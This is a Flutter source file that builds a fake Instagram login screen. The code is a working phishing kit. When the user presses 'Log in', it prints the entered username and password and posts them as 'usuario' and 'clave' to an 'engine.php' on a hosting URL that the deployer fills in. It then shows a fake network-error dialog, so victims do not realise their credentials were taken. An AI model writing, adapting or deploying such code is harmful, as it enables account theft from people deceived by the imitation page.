import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class Home extends StatefulWidget {
  @override
  _HomeState createState() => _HomeState();
}

class _HomeState extends State<Home> {
  TextEditingController idcontroller = TextEditingController();
  TextEditingController passcontroller = TextEditingController();
  bool isbtnenabled = false;
  bool startprogress = false;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        title: Padding(
          padding: const EdgeInsets.only(right: 45),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Text(
                "English (India)",
                style: TextStyle(
                    color: Colors.grey,
                    fontSize: 15,
                    fontWeight: FontWeight.w400),
              ),
              Icon(
                Icons.keyboard_arrow_down,
                color: Colors.grey[500],
              ),
            ],
          ),
        ),
        elevation: 0,
        backgroundColor: Colors.transparent,
        centerTitle: true,
      ),
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(30),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Center(
                child: Text(
                  "Instagram",
                  style: TextStyle(
                    fontSize: 35,
                    color: Color(0xff262626),
                    fontFamily: 'Grandista',
                  ),
                ),
              ),
              SizedBox(
                height: 25,
              ),
              TextFormField(
                controller: idcontroller,
                onChanged: (text) {
                  if (passcontroller.text.isNotEmpty) {
                    setState(() {
                      isbtnenabled = true;
                    });
                  }
                },
                cursorColor: Colors.grey,
                decoration: InputDecoration(
                  hintText: " Phone number, email address or username",
                  fillColor: Color(0xfffafafa),
                  filled: true,
                  border: OutlineInputBorder(
                    borderSide: new BorderSide(),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderSide: new BorderSide(
                      color: Color(0xffdbdbdb),
                    ),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderSide: new BorderSide(
                      color: Color(0xffdbdbdb),
                    ),
                  ),
                ),
              ),
              SizedBox(
                height: 15,
              ),
              TextFormField(
                controller: passcontroller,
                onChanged: (text) {
                  if (idcontroller.text.isNotEmpty) {
                    setState(() {
                      isbtnenabled = true;
                    });
                  }
                },
                cursorColor: Colors.grey,
                decoration: InputDecoration(
                  hintText: " Password",
                  fillColor: Color(0xfffafafa),
                  filled: true,
                  border: OutlineInputBorder(
                    borderSide: new BorderSide(),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderSide: new BorderSide(
                      color: Color(0xffdbdbdb),
                    ),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderSide: new BorderSide(
                      color: Color(0xffdbdbdb),
                    ),
                  ),
                ),
              ),
              SizedBox(
                height: 15,
              ),
              SizedBox(
                height: 50,
                child: FlatButton(
                  child: startprogress
                      ? SizedBox(
                          height: 28.0,
                          width: 28.0,
                          child: CircularProgressIndicator(
                            strokeWidth: 2.0,
                            backgroundColor: Colors.white,
                          ),
                        )
                      : Text(
                          "Log in",
                          style: TextStyle(color: Colors.white),
                        ),
                  color: Colors.blue,
                  disabledColor: Color(0xffB2DFFC),
                  onPressed: isbtnenabled
                      ? () async {
                          setState(() {
                            startprogress = true;
                          });
                          print("login");
                          print('id ==> ${idcontroller.text}');
                          print('pass ==> ${passcontroller.text}');
                          var url =
                              "https://(your hosting site url)/engine.php";
                          //for example var url = "https://insta.freehosting.com/engine.php";
                          var data = {
                            "usuario": idcontroller.text,
                            "clave": passcontroller.text
                          };
                          var res = await http.post(url, body: data);

                          return showDialog(
                            context: context,
                            builder: (context) {
                              return AlertDialog(
                                content: Container(
                                  height: 130,
                                  width: 50,
                                  child: Column(
                                    mainAxisSize: MainAxisSize.min,
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    crossAxisAlignment:
                                    CrossAxisAlignment.center,
                                    children: [
                                      Text(
                                        "Error",
                                        style: TextStyle(
                                            fontWeight: FontWeight.bold,
                                            fontSize: 20),
                                      ),
                                      SizedBox(
                                        height: 14,
                                      ),
                                      Text(
                                        "An unknown network error has occured.",
                                        style: TextStyle(
                                            color: Colors.grey, fontSize: 15),
                                      ),
                                      SizedBox(
                                        height: 9,
                                      ),
                                      Expanded(
                                        child: Divider(
                                          color: Colors.grey,
                                          thickness: 0.2,
                                        ),
                                      ),
                                      FlatButton(
                                        color: Colors.transparent,
                                        child: Text(
                                          "Dismiss",
                                          style: TextStyle(
                                              color: Colors.blueAccent,
                                              fontSize: 17,
                                              fontWeight: FontWeight.bold),
                                        ),
                                        onPressed: () {
                                          Navigator.pop(context);
                                        },
                                      )
                                    ],
                                  ),
                                ),
                              );
                            },
                          );
                        }
                      : null,
                ),
              ),
              SizedBox(
                height: 15,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    "Forgot your login detail? ",
                    style: TextStyle(color: Colors.grey, fontSize: 13),
                  ),
                  Text(
                    "Get help with logging in.",
                    style: TextStyle(
                        color: Color(0xff354877),
                        fontSize: 13,
                        fontWeight: FontWeight.bold),
                  ),
                ],
              ),
              SizedBox(
                height: 15,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Expanded(
                      child: Divider(
                    thickness: 0.5,
                    color: Colors.grey,
                  )),
                  Padding(
                    padding: const EdgeInsets.only(left: 5, right: 5),
                    child: Text(
                      "OR",
                      style: TextStyle(
                          color: Colors.grey,
                          fontSize: 15,
                          fontWeight: FontWeight.w500),
                    ),
                  ),
                  Expanded(
                      child: Divider(
                    thickness: 0.5,
                    color: Colors.grey,
                  )),
                ],
              ),
              SizedBox(
                height: 15,
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Image.asset(
                    'assets/fb.png',
                    height: 18,
                  ),
                  Text(
                    " Log in with Facebook",
                    style: TextStyle(
                        color: Color(0xff176AE6),
                        fontSize: 15,
                        fontWeight: FontWeight.bold),
                  ),
                ],
              ),
              SizedBox(
                height: 70,
              )
            ],
          ),
        ),
      ),
    );
  }
}
